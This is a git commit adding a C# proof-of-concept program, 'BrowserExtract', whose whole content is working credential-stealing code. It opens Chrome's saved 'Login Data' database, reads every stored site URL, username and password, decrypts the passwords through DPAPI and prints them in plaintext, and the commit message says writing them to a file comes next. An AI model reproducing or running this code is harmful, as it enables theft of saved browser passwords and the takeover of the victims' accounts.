0d9792891cb2b0d9558ce31ed65c853821b865a0
Jan <jackflash5500@gmail.com>
2015-01-09 09:26:58 +0100

    PoC
    Just prints out all Information about chrome in the console. WIll wirte
    to file soon

---
+++ BrowserExtract/Program.cs
@@ -0,0 +1,34 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Data.SQLite;
+
+namespace BrowserExtract
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\..\Local\Google\Chrome\User Data\Default\Login Data";
+            SQLiteConnection connection = new SQLiteConnection("Data Source=" + path);
+            connection.Open();
+
+            SQLiteCommand command = new SQLiteCommand(connection);
+            command.CommandText = String.Format("SELECT action_url, username_value, password_value FROM logins");
+            	SQLiteDataReader reader = command.ExecuteReader();
+
+            while (reader.Read())
+
+            {
+                byte[] password = (byte[])reader[2];
+                string plaintext = DPAPI.Decrypt(Convert.ToBase64String(password));
+
+                Console.WriteLine(reader[0].ToString() + "|" + reader[1].ToString() + "|" + plaintext);
+
+            }
+            connection.Close();
+        }
+    }
+}
